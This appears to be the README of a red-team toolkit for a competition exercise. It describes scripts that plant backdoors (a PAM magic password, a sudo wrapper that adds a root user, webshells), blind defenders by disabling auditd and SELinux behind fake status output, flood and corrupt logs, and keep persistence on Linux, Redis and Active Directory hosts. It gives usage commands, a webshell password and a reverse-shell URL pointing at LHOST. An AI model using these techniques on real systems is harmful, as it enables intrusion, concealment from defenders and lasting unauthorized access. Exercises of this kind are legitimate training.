# Tooling descriptions

## Map
```
├── alias-bashrc.sh
├── break-net-tools.sh
├── compromise-w-who.sh
├── evil-timer
│   ├── deploy-evil-timer.sh
│   ├── poison-timer.sh
│   ├── python2-certbot.service
│   └── python2-certbot.timer
├── flood-journal.sh
├── infinite-users.sh
├── lock-busybox.sh
├── no-apt.sh
├── no-audit.sh
├── no-selinux.sh
├── persist
│   ├── ad_persist.sh
│   ├── linux_persist.sh
│   ├── redis_persist.sh
│   └── windows_persist.ps1
├── pam-backdoor
│   ├── deploy-pam-backdoor.sh
│   └── pam_audit_log.c
├── pihole-github-sinkhole.sh
├── README.md
├── reconboard-v5
│   └── ...
├── shadow-crond.sh
├── sinkhole-scripts.sh
├── sudo-biNOry.sh
├── the-toucher.sh
├── vandalize-bashrc.sh
├── vim-persist.sh
├── webshells
│   ├── deploy_lamp_shell.sh
│   ├── deploy_nginx_flask_shell.sh
│   └── shell.php
└── yay-install.sh
```

## Desc
| tool name | functionality |
| --- | --- |
| alias-bashrc.sh | searches for .bashrc files and injects a sudo() shell function that silently flushes nftables every time sudo is run, whether the user confirms or cancels — skips greyteam/ansible/scoring users |
| break-net-tools.sh | breaks curl, wget, and git via binary shadowing + proxy poisoning + shell function injection, all reversible, local git ops still work so scoring doesnt break — usage: `install\|remove\|status` |
| compromise-w-who.sh | backs up the `w` and `who` binaries then overwrites them with fakes, `w` shows hardcoded fake session data, `who` just says "better question is, where?" |
| evil-timer | poison-timer.sh is the real one, deploy-evil-timer.sh is just the old placeholder that deploys the certbot timer which doesnt do anything — apt-daily.timer is last candidate now (see note below) |
| flood-journal.sh | poisons journald.conf, corrupts existing .journal files with urandom garbage so historical logs are unreadable, shadows journalctl to report no entries and 0 disk usage, floods with 8 parallel workers via /dev/log, installs a drop-in on systemd-journald itself so workers relaunch whenever journald restarts — watchdog is handled by shadow-crond hidden spool (no visible cron entry) — usage: `install\|remove\|status` |
| infinite-users.sh | symlinks nologin to bash so any service account can get a shell, also writes a sudoers.d entry giving all those accounts full nopasswd root |
| lock-busybox.sh | replaces all busybox binaries with a gated wrapper — no token = segfault, red team uses RT_TOK=rt2025!delta or the hidden binary at /var/cache/.syspkg/busybox.real directly, also chmod 700s the shadow-crond copy so blue team cant call it — **must run AFTER shadow-crond.sh** — usage: `install\|remove\|status` |
| no-apt.sh | renames sources.list and sources.list.d so apt-get silently breaks — idempotent, skips if already deployed — usage: `install\|remove\|status` |
| no-audit.sh | flushes all audit rules and disables kernel auditing with the real auditctl, then shadows it with a no-op wrapper so blue team cant add rules back, also redirects auditd log output to /dev/null and truncates rules.d — auditd stays "active (running)" the whole time — idempotent, skips if backup exists |
| no-selinux.sh | immediately sets permissive with the real setenforce, persists SELINUX=permissive in config, then shadows setenforce (no-op), getenforce (always says Enforcing), sestatus (full fake enforcing output), and semodule (no-op) — blue team sees enforcing but nothing is actually being enforced — idempotent, skips if backup exists |
| pam-backdoor | compiles pam_audit_log.so (looks like a legit audit stub) and prepends `auth sufficient` to /etc/pam.d/common-auth, lets you auth as any user with the magic password without touching real credentials |
| pihole-github-sinkhole.sh | installs pihole unattended and sinkholes all github domains (github.com, githubusercontent.com, ghcr.io, etc) to 0.0.0.0, also poisons /etc/hosts as a backup layer |
| shadow-crond.sh | copies busybox to a hidden path so ps shows a system-looking name, runs busybox crond with a custom spool dir invisible to crontab -l, hides behind a systemd-timesyncd-helper service, hidden spool also watches flood-journal service every 5 min — edit /var/cache/.syspkg/tabs/root to change payload — **must run BEFORE lock-busybox.sh** — usage: `install\|remove\|status` |
| sinkhole-scripts.sh | sets up a dnsmasq sinkhole for any domain, defaults to pointing github.com at a dead ip, has install/remove/test |
| sudo-biNOry.sh | replaces /usr/bin/sudo with a wrapper that silently creates a backdoor user `sudoer` with full nopasswd root on first invocation, then passes through normally |
| the-toucher.sh | wanders the filesystem randomly and touches files to corrupt timestamps, messes with log rotation and anything that uses mtime |
| vandalize-bashrc.sh | searches the machine for .bashrc files and adds a big `:3` to them |
| vim-persist.sh | injects a vimscript autocmd into all .vimrc files that flushes iptables and nftables silently on every vim open, also hits /etc/vim/vimrc.local for system-wide coverage on users without a .vimrc — skips greyteam/ansible/scoring users, /etc/vim/vimrc.local respects the same whitelist |
| yay-install.sh | installs yay, probably doesnt work on ubuntu but whatever |

### Deployment notes

- **shadow-crond.sh must run before lock-busybox.sh** — lock-busybox chmod 700s shadow-crond's busybox copy, but if lock-busybox runs first, shadow-crond will try to use the locked wrapper (no token = segfault) and abort
- **flood-journal.sh watchdog** — no longer installs a visible root crontab entry or /etc/cron.d file; shadow-crond's hidden spool at /var/cache/.syspkg/tabs/root watches for `network-health-monitor` every 5 min
- **poison-timer.sh apt-daily caveat** — apt-daily.timer is the last auto-select candidate because if no-apt.sh has already run, apt-daily's ExecStart may fail, which prevents ExecStartPost (the fw flush) from firing; man-db/logrotate/fstrim are preferred targets
- **idempotent scripts** — no-apt.sh, no-audit.sh, no-selinux.sh all exit early if already deployed, safe to re-run via Ansible
- **shared hidden dir** — all scripts use /var/cache/.syspkg/ for backups and binaries (chmod 700)

## TODO
- Multiple ssh binaries running on different ports
- 20 Docker binaries all running as hidden services

---

## persist/ — Deep Persistence Scripts

| Script | Targets | Methods |
|--------|---------|---------|
| `persist/linux_persist.sh` | svc-ftp-01, svc-redis-01, svc-database-01, svc-amazin-01, svc-samba-01 | SSH authorized_keys, cron, systemd service, SUID bash copy, .bashrc hook |
| `persist/redis_persist.sh` | svc-redis-01, svc-database-01 | Redis RDB write → SSH key injection + /etc/cron.d write |
| `persist/windows_persist.ps1` | svc-ad-01, svc-smb-01 | Scheduled task (SYSTEM), reg Run key, WMI event sub, startup folder VBS, hidden service |
| `persist/ad_persist.sh` | svc-ad-01 | DCSync, golden ticket, backdoor Domain Admin, AdminSDHolder ACL, DNS record injection |

```bash
# Linux (any Ubuntu host)
./persist/linux_persist.sh <target_ip> <user> <pass> <lhost> <lport>

# Redis (unauthenticated open Redis)
./persist/redis_persist.sh <target_ip>

# AD (after getting DA creds)
./persist/ad_persist.sh <dc_ip> <domain.local> Administrator <pass> <lhost>

# Windows (run on a PS shell on target, or via CrackMapExec -X)
#   powershell -ep bypass -File persist/windows_persist.ps1 -LHost <lhost> -LPort 4446
```

## webshells/ — Webshell Deployers

| Script | Target | Technique |
|--------|--------|-----------|
| `webshells/shell.php` | WP/LAMP hosts | Feature-rich PHP webshell (cmd / upload / read / revshell) |
| `webshells/deploy_lamp_shell.sh` | svc-samba-01 (LAMP) | Samba→webroot write, LFI+log poisoning, PHPMyAdmin SELECT INTO OUTFILE |
| `webshells/deploy_nginx_flask_shell.sh` | svc-redis-01 (Flask/Nginx) | Jinja2 SSTI→RCE, Redis session forgery, Nginx alias traversal, Werkzeug debug console |

```bash
chmod +x webshells/*.sh persist/*.sh

# LAMP
./webshells/deploy_lamp_shell.sh <target_ip> guest ""

# Flask/Nginx
./webshells/deploy_nginx_flask_shell.sh <target_ip> 80 6379 <lhost>
```

### shell.php quick ref (password: `rt2025!delta` — change before use)

| Action | URL |
|--------|-----|
| Command | `?p=rt2025!delta&c=id` |
| Read file | `?p=rt2025!delta&act=read&f=/etc/passwd` |
| Upload | `POST ?p=rt2025!delta&act=upload` |
| Rev shell | `?p=rt2025!delta&act=revshell&rh=LHOST&rp=4444` |
